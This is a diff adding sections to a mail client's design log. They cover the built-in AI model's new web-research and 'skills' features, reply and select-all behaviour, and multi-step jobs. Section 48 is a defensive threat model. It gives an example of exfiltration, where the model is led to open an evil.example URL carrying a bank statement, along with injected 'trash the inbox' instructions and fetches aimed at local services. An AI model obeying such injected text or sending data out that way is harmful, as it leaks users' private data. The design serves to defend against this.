@@ -2774,3 +2774,171 @@ The store keeps recipients as addresses, so the names are the ones those
 people signed their own mail with, found by address through the sender index;
 someone only ever written to is shown by address, and so is anyone who writes
 their address in capitals, which the index does not match.
+
+## 48. The assistant on the web, and the skills it is handed
+
+The assistant could read mail and act on it; it could not find out what a
+company was, what a form needed, or whether a deadline in a letter was the
+law or the sender's wish. Two things were asked for: let it research online
+when the person asks, and let it take on *skills* — files of instructions
+for one kind of job, the way other agents are taught — and let both be
+switched on and off in the settings. Both are done, and the interesting part
+is what the web changes about the one rule the assistant already lived by.
+
+### Mail could only lie; the web can also listen
+
+Everything the assistant read until now was written by strangers, and the
+rule was that text in a message is data, never an instruction. That rule
+held because the worst an injected message could do was move mail — queued,
+undoable, shown as a card — or draft something the person would see before
+sending. There was nowhere for anything to *go*.
+
+An address is somewhere for things to go. A model that can open
+`https://evil.example/?q=` followed by the contents of a bank statement has
+posted the statement to a stranger, and the message that told it to do so
+need only be a message. So the web tools are not just two more tools: they
+are the first way out, and three things close it.
+
+**Only addresses that were given.** The assistant may open an address the
+person wrote, an address a search returned, or a link on a page it read —
+each taken from the structured part of a tool's result, never from the text
+of a page and never from a message. The allow-list is rebuilt from the
+conversation each time, so it needs no state and cannot drift: a URL in a
+snippet's text is not on it, a URL in a mail's body is not on it, and the
+same URL with one more query parameter is not on it. A link in a message
+the person wants opened is opened when they paste it, which is one line in
+the chat and the whole difference. The search query is the one address a
+model composes itself; it is capped at two hundred characters, the model is
+told never to put mail in one, and the residual — the search engine learns
+what was asked — is written beside the switch.
+
+**Nothing on this computer or its network.** Ollama, Paperless and the
+scanner all answer HTTP on the local network, with no password between a
+request and a document. The fetcher resolves a name itself, refuses
+loopback, private and link-local addresses, and pins the request to the
+addresses it checked, so a name that answers differently the second time
+cannot redirect it inside; each redirect is followed by hand and checked
+the same way. The person's own search engine is the one exception, because
+they typed its address, and it is told nothing but the query.
+
+**Nothing read from the web leads to a change.** A page can say "now trash
+the inbox", and a model can be talked into it. So once anything from the
+web has been read in a question, that question can look and draft and
+nothing else: no moves, no signing, no note. And once anything from the web
+has been read in a conversation, that conversation can never keep a note,
+create a task or take on a skill — the things that outlive it. The person
+is told in the chat, and asks again in a new question or a new chat. That
+is a sentence's inconvenience for them and the end of the road for an
+injected page: it would have to make the person start a new conversation
+and ask for the harm themselves.
+
+### A skill is instructions on purpose, so a person reads it
+
+A skill is the most direct injection there is: a file whose whole content
+is instructions, from somebody else, meant to be followed. The only safe
+thing to do with one is what a person does with a program — read it before
+running it — and the design makes that the only path. The assistant, or
+the settings page, can *download* a skill, only from an address the person
+gave. It lands as a file waiting to be read. Nothing in it reaches a model
+until the person has had the whole text on screen in the settings and
+pressed Accept, which sits beneath the text, after a list of what stood out
+in it — addresses it names, talk of hiding, ignoring rules, secrets, or
+sending something somewhere — and which no tool can press. The list is
+labelled as words that stood out, not a verdict, because a list of words is
+all it is.
+
+An accepted skill goes into the system prompt fenced, after the rules, with
+the model told that a skill adds a way of working and overrides nothing: not
+the rule that mail and pages are data, not the tools it has. A skill
+fetched again after acceptance waits beside the accepted one, so an update
+is read like the first version was; one fetched again before anyone read it
+simply replaces the earlier download.
+
+### Off until switched on, and enforced where it counts
+
+Both switches live in the store, not in the window's storage, because the
+core enforces them: a tool the person has not switched on is not in the
+list a model is offered, and a model that asks for it by name anyway is
+told no. The window's checkboxes only report what the core will do. The
+search engine is DuckDuckGo's HTML page read for its results, which needs
+no account and no key, or a SearXNG of the person's own; the page may change
+shape or ask for a captcha, and then the assistant says so rather than
+pretending the web was empty.
+
+## 49. A reply goes with its message, and ⌘A means all of them
+
+Three things the list did were the kind a person notices without being
+able to say what is wrong. ⌘A did nothing, or selected the text of the
+whole window. Opening another message while a reply was open left the
+reply where it was, under a message it was not an answer to, so what Send
+would do was no longer on the screen. And a click on a row opened the
+message twice — `select` opened it because the pane was showing one, then
+the click handler opened it again — which fetched everything twice and
+marked post read twice.
+
+### A reply belongs to what it answers
+
+The pane is a grid: the message above, the answer below. That layout is
+the promise that what is being answered is in front of you, and it was
+broken the moment another message went above. So opening another message
+takes a reply or a forward away. Nothing typed yet — the recipients and
+quoting it opened with are what the core fills in and cost nothing to lose
+— and it goes without a word. Anything typed, including what the
+assistant wrote, is asked about in the window's own sheet, and "keep
+writing" puts the cursor back on the message the reply is for. Escape in
+the reply asks the same question for the same reason; it used to discard a
+page of typing on one key. Reply pressed again, or New message, or a
+scheduled draft reopened from the outbox, all go through the same
+question, where before each of them emptied compose on its own.
+
+A new message is about nothing on the list and is left alone: it stays
+under whatever is read, the way a compose box stays while the rest of the
+mailbox is looked through.
+
+### ⌘A is every message, and every message is acted on
+
+⌘A picks every row — the ones below the screen included, which the list
+has not fetched yet. The list is sparse on purpose, so the pick is by
+index and anything done to it fetches the pages it is missing first:
+"archived 300 messages" means 300, not the two screens that happened to be
+loaded. The one place ⌘A keeps its usual meaning is after the pointer was
+last put down in the open message, where it means that message's text; the
+window remembers which side the pointer went down on because a paragraph
+cannot take focus and neither can the list. Marking read with `u` acts on
+the pick too, as every other key already did.
+
+### A search is in the order the list is in
+
+Search results came back as FTS5 ranked them, best match first, under a
+toggle that still said "newest". §12's reasoning — that a search is a
+different ordering of a different set — was right about the set and wrong
+about the ordering: a person with a list sorted by date wants the matches
+by date too, and a toggle that is on screen and does nothing is a lie. So
+the store's search takes the order with it, by date in either direction
+with rank as the tie-break, and the window passes the toggle's value with
+every search; turning the toggle round re-runs the search instead of
+throwing it away. Rank stays the default for the assistant and the MCP
+tool, where the best match is the one wanted. Post was already searched
+through Paperless in date order; the window simply had not been passing
+which date.
+
+## 50. A job with several steps is done to the end
+
+"Put all the application mail in a new mailbox and tell me whether any of
+the replies are positive" is one sentence to the person and five steps to
+the assistant: search with alternatives, make the folder, move what was
+found, read what is in it, report. It stopped twice on the way. The prompt
+told it to create a folder "if the person agrees", so it asked instead of
+doing what it had just been asked; and ten rounds of tools ran out while it
+was still reading one message per round.
+
+So the prompt now says that a mailbox or a label is a folder, that one the
+person asks for is created without asking, and that a job with several
+steps is done to the end before answering, with the one question left where
+it was — a move of more than thirty messages is said first. `read_messages`
+reads up to twenty-five messages in one round, each cut to 2,500
+characters, which is a folder's worth of replies read at once instead of
+one per round; and the loop allows twenty-five rounds instead of ten, which
+no question needs but a job does. A folder created a moment ago is one a
+move can go to because `create_folder` writes it to the store as well as
+the server; the test holds that to be true.
